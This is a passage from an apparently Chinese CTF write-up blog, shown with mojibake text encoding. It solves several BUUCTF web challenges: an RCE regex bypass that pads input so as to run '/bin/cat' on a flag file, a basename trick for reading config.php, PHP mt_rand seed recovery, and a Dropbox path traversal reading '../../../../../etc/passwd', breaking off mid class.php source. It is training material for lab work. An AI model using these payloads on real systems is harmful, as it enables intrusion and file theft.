class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000000</span><br>url=<span class="hljs-string">&#x27;http://80acce67-8aec-44ab-9b7c-afddf7295d76.node4.buuoj.cn:81/&#x27;</span><br><br>data=&#123;<br><br>    <span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span>+<span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>)+<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>&#125;<br>r=requests.post(url=url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//phpæºç </span><br></code></pre></td></tr></table></figure><p><code>&#39;PHP_SELF&#39;</code> å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶</p><p>æœ‰ä¸¤ç‚¹ï¼š</p><div class="code-wrapper"><pre><code class="hljs">- ä¼ å…¥guess=éšæœºæ•°secret- ä¸èƒ½æ£€æµ‹åˆ°config.php</code></pre></div><p>ä»¥ä¸ºæ˜¯ä¼ªéšæœºæ•°ï¼Œç„¶è€Œå¹¶ä¸æ˜¯ï¼Œç…äº†ä¸€çœ¼feng å“¥çš„wpè¿™é‡Œæœ‰ä¸ªfuzzçš„æ€è·¯æ²¡æœ‰æƒ³åˆ°æˆ‘çœŸçš„â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;/index.php/config.php/&quot;</span>.chr(<span class="hljs-variable">$i</span>);<br>    <span class="hljs-keyword">if</span>(!check(<span class="hljs-variable">$str</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;ï¼š&quot;</span>.basename(<span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">echo</span> PHP_EOL;<br>    &#125;<br>&#125;  <span class="hljs-comment">//è¿™é‡Œå¯¹asciiç è¿›è¡Œéå†æŸ¥çœ‹å“ªä¸ªå­—ç¬¦ä¼šç»•è¿‡basenameï¼Œå®é™…ä¸Šbasenameä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éasciiå€¼ï¼ˆasciiä¸ºå•å­—èŠ‚å­—ç¬¦ï¼Œä¸­æ–‡æ˜¯ä¸¤ä¸ªå­—ç¬¦ï¼‰æ‰€ä»¥è¿™é‡ŒåŠ ä¸Šä¸­æ–‡ä¹Ÿå¯ä»¥</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201202035712.png" alt="image-20220120203538604"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ asciiå­—ç¬¦&gt;128ä¹‹å å…¨è¢«è§£æä¸ºconfig.php</p><p>è¿™é‡Œç”±äºæˆ‘ä¸ç†Ÿæ‚‰ascii urlç¼–ç çš„è¡¨ç¤ºå½¢å¼ï¼Œå°±è‡ªå·±åˆå†™äº†ä¸ªè„šæœ¬ å†™å®Œå‘ç°å¯ä»¥ä¸Šç½‘æŸ¥â€¦å•¥bäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$str</span>=chr(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;Asciiï¼š&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;     &#x27;</span>.rawurldecode(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;     urlencodeï¼š&#x27;</span>.urlencode(chr(<span class="hljs-variable">$i</span>)));<br>        <span class="hljs-keyword">print</span>(PHP_EOL);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201202037849.png" alt="image-20220120203748770"></p><p>ä¹Ÿå°±æ˜¯%80å¾€å</p><p>äºæ˜¯æ„å»º   <code>http://2af286ad-b22b-4f10-9e57-950fc5bf2036.node4.buuoj.cn:81/index.php/config.php/%81?source</code>  å³å¯</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p>æ ¹æ®htmlçš„ajaxä»£ç å¾—çŸ¥ï¼Œå­˜åœ¨ä¸€ä¸ªcheck.phpï¼Œè·Ÿè¿›ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>session_start();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=rand(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br>mt_srand(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$str_long1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$str_show</span> = substr(<span class="hljs-variable">$str</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str_show</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>]===<span class="hljs-variable">$str</span>)&#123;x<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<br>show_source(<span class="hljs-string">&quot;check.php&quot;</span>);<br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">è¿™ä¸‹æ€»è¯¥æ˜¯ä¼ªéšæœºæ•°äº†å§ï¼Œä¼ªéšæœºæ•°ç”±å®ƒçš„ç§å­ç”Ÿæˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæƒ³çŸ¥é“ä¼ªéšæœºæ•°å°±éœ€è¦çŸ¥é“å®ƒçš„ç§å­æ˜¯ä»€ä¹ˆ</code></pre></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>str1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>str2 = <span class="hljs-string">&#x27;S8i4xgjCk&#x27;</span>       <span class="hljs-comment">#å·²çŸ¥çš„</span><br>str3 = str1[::-<span class="hljs-number">1</span>]<br>length = <span class="hljs-built_in">len</span>(str2)<br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str2)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(str1)):<br>        <span class="hljs-keyword">if</span> str2[i] == str1[j]:<br>            res += <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(str1) - <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(res)<br><span class="hljs-comment">#54 54 0 61 34 34 0 61 8 8 0 61 30 30 0 61 23 23 0 61 6 6 0 61 9 9 0 61 38 38 0 61 10 10 0 61</span><br></code></pre></td></tr></table></figure><p>ç„¶åç”¨è¿™ä¸ªç§å­å»ç”Ÿæˆéšæœºæ•°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201202106632.png" alt="image-20220120210636554"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    mt_srand(<span class="hljs-number">823202674</span>);<br>    <span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br>    <span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>        <span class="hljs-variable">$str</span>.=substr(<span class="hljs-variable">$str_long1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ›¿æ¢ä¸€ä¸‹mt_srandå†…çš„å€¼ï¼Œç„¶ååœ¨æ¡†æ¡†é‡Œæäº¤è¿™ä¸ªå€¼ï¼ŒæˆåŠŸgetFlag</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>è¿™é‡Œæ³¨å†Œï¼Œç™»å½•è´¦å·ä¹‹åï¼Œå‘ç°ä¸‹è½½è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä¸å¯åœ¨ä¸‹è½½çš„è¿‡ç¨‹ä¸­ä¿®æ”¹æ–‡ä»¶åå‚æ•°ä»è€Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–çš„åŠŸèƒ½</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221134759.png" alt="image-20220122113354577"></p><p>æ˜¯å¯ä»¥çš„  <code>../../../../../etc/passwd</code></p><p>äºæ˜¯æ„å»ºå½¢å¦‚ <code>../../index.php</code> å¯¹å…¶ä»–é¡µé¢è¿›è¡Œä¸‹è½½</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br>ini_set(<span class="hljs-string">&quot;open_basedir&quot;</span>, getcwd() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br>chdir(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;open(<span class="hljs-variable">$filename</span>) &amp;&amp; stristr(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    Header(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    Header(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;close();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute();<br>        <span class="hljs-variable">$stmt</span>-&gt;store_result();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;user_exist(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = sha1(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-keyword">$this</span>-&gt;db-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;bind_param(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;execute();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;user_exist(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = sha1(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span 